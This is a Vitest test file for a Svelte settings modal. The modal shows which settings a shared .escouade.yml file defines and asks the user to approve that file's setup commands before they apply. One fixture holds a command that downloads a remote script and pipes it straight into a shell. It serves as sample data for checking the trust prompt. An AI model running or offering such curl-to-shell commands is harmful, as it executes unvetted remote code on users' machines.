import { render, screen, within } from '@testing-library/svelte';
import userEvent from '@testing-library/user-event';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { app } from '../../lib/state.svelte';
import type { Project, SharedFile } from '../../lib/types';
import { fakeBackend, project, resetApp } from '../../test/ipc';
import SettingsModal from '../modals/SettingsModal.svelte';

vi.mock('../../lib/terminals', () => ({ launchLog: () => ({}), disposeLog() {} }));

const PENDING = {
  hash: 'h1',
  commands: {
    'worktrees.setup': [{ command: 'npm ci && curl https://x.sh | sh', shell: 'bash', cwd: 'web' }],
    'board.test_command': 'npm test',
  },
};

function shared(file: Partial<SharedFile> | null, local: string[] = []): Project {
  return project({
    worktreePerAgent: true,
    shared: {
      local,
      trusted: '',
      file: file && {
        keys: ['worktrees.per_agent', 'board.merge_strategy', 'worktrees.setup', 'board.test_command', 'git.commit_mode'],
        values: {},
        warnings: [],
        error: null,
        version: 1,
        pending: null,
        ...file,
      },
    },
  });
}

/** The row of a setting, by its label. */
const row = (label: string) =>
  screen
    .getAllByText(label)
    .find((e) => e.classList.contains('l'))!
    .closest('.row') as HTMLElement;

describe('.escouade.yml in the settings (ESC-146)', () => {
  beforeEach(() => {
    app.modal = { kind: 'settings' };
  });

  it('offers to export when the repository has none, and marks nothing', async () => {
    resetApp({ projects: [shared(null)] });
    const backend = fakeBackend({ shared_write: () => shared({}) });
    render(SettingsModal, { tab: 'projects', projectId: 'p1' });
    expect(screen.getByText(/Ce dépôt n’a pas de \.escouade\.yml/)).toBeInTheDocument();
    expect(screen.queryByText('Défini par .escouade.yml')).toBeNull();
    await userEvent.click(screen.getByRole('button', { name: 'Exporter vers .escouade.yml' }));
    expect(backend.called('shared_write')[0].args).toEqual({ projectId: 'p1' });
    expect(app.toasts.at(-1)?.text).toBe('.escouade.yml écrit. Commite-le pour le partager.');
    // The project as written: its settings marked from now on.
    expect(within(row('Un worktree par agent')).getByText('Défini par .escouade.yml')).toBeInTheDocument();
  });

  it('marks the settings the file defines, says what it read and what was left out', () => {
    resetApp({
      projects: [shared({ warnings: [{ line: 4, text: 'clé inconnue : board.drafts (voulais-tu dire board.draft_pr ?), ignorée' }] })],
    });
    fakeBackend();
    render(SettingsModal, { tab: 'projects', projectId: 'p1' });
    expect(screen.getByText('Réglages lus dans .escouade.yml (version 1) : 5 réglages définis par le fichier.')).toBeInTheDocument();
    expect(screen.getByText('Ligne 4 : clé inconnue : board.drafts (voulais-tu dire board.draft_pr ?), ignorée')).toBeInTheDocument();
    expect(within(row('Un worktree par agent')).getByText('Défini par .escouade.yml')).toBeInTheDocument();
    // Nothing on what the file leaves alone.
    expect(within(row('Dossier des worktrees')).queryByText(/\.escouade\.yml/)).toBeNull();
  });

  it('shows the commands waiting in full, and trusts only those read', async () => {
    resetApp({ projects: [shared({ pending: PENDING })] });
    const trusted = shared({});
    const backend = fakeBackend({ shared_trust: () => trusted });
    render(SettingsModal, { tab: 'projects', projectId: 'p1' });
    const region = screen.getByRole('region', { name: 'Commandes en attente de ton accord' });
    expect(within(region).getByText('npm ci && curl https://x.sh | sh')).toBeInTheDocument();
    expect(within(region).getByText('web')).toBeInTheDocument();
    expect(within(region).getByText('npm test')).toBeInTheDocument();
    expect(within(row("À l'ouverture d'un worktree")).getByText('Défini par .escouade.yml, en attente de ton accord')).toBeInTheDocument();
    await userEvent.click(within(region).getByRole('button', { name: 'Faire confiance à ces commandes' }));
    expect(backend.called('shared_trust')[0].args).toEqual({ projectId: 'p1', hash: 'h1' });
    expect(screen.queryByRole('region', { name: 'Commandes en attente de ton accord' })).toBeNull();
    expect(app.toasts.at(-1)?.text).toBe('Commandes approuvées : elles s’appliquent au projet.');
  });

  it('says a setting kept on this machine goes first, and writes it into the file or takes the file’s back', async () => {
    resetApp({ projects: [shared({}, ['worktrees.per_agent'])] });
    const backend = fakeBackend({
      shared_write: () => shared({}),
      shared_unkeep: () => ({ ...shared({}), worktreePerAgent: false }),
    });
    render(SettingsModal, { tab: 'projects', projectId: 'p1' });
    const r = row('Un worktree par agent');
    expect(within(r).getByText('Réglage local de cette machine : il passe devant .escouade.yml.')).toBeInTheDocument();
    await userEvent.click(within(r).getByRole('button', { name: 'Écrire dans .escouade.yml' }));
    expect(backend.called('shared_write')[0].args).toEqual({ projectId: 'p1', keys: ['worktrees.per_agent'] });
    expect(within(row('Un worktree par agent')).getByText('Défini par .escouade.yml')).toBeInTheDocument();

    // Kept again, then given back to the file: its value shown in the draft.
    app.replaceProject(shared({}, ['worktrees.per_agent']));
    await userEvent.click(await within(row('Un worktree par agent')).findByRole('button', { name: 'Reprendre la valeur du fichier' }));
    expect(backend.called('shared_unkeep')[0].args).toEqual({ projectId: 'p1', key: 'worktrees.per_agent' });
    expect(screen.getByRole('switch', { name: 'Un worktree par agent' })).toHaveAttribute('aria-checked', 'false');
  });

  it('marks the Kanban’s settings too', () => {
    resetApp({ projects: [shared({ pending: PENDING })] });
    fakeBackend();
    render(SettingsModal, { tab: 'board', projectId: 'p1' });
    expect(within(row('Commande de tests')).getByText('Défini par .escouade.yml, en attente de ton accord')).toBeInTheDocument();
    expect(within(row('Message de commit généré')).queryByText(/\.escouade\.yml/)).toBeNull();
  });

  it('marks « Projet privé » and the tickets’ agents, kept on this machine or not, never what stays local (ESC-163)', () => {
    resetApp({
      projects: [shared({ keys: ['private', 'board.model', 'board.effort', 'board.mode'] }, ['board.mode'])],
    });
    fakeBackend();
    const { unmount } = render(SettingsModal, { tab: 'projects', projectId: 'p1' });
    expect(within(row('Projet privé')).getByText('Défini par .escouade.yml')).toBeInTheDocument();
    unmount();
    render(SettingsModal, { tab: 'board', projectId: 'p1' });
    expect(within(row('Modèle')).getByText('Défini par .escouade.yml')).toBeInTheDocument();
    expect(within(row('Effort')).getByText('Défini par .escouade.yml')).toBeInTheDocument();
    expect(within(row('Mode')).getByText('Réglage local de cette machine : il passe devant .escouade.yml.')).toBeInTheDocument();
    expect(within(row('En parallèle')).queryByText(/\.escouade\.yml/)).toBeNull();
    expect(within(row('Attribuer les tickets automatiquement')).queryByText(/\.escouade\.yml/)).toBeNull();
  });

  it('says why a file that cannot be read sets nothing', () => {
    resetApp({ projects: [shared({ error: { line: 3, text: '.escouade.yml illisible : crochet non fermé' } })] });
    fakeBackend();
    render(SettingsModal, { tab: 'projects', projectId: 'p1' });
    expect(screen.getByText(/rien n’en est appliqué : Ligne 3 : \.escouade\.yml illisible/)).toBeInTheDocument();
    expect(screen.queryByText('Défini par .escouade.yml')).toBeNull();
  });
});
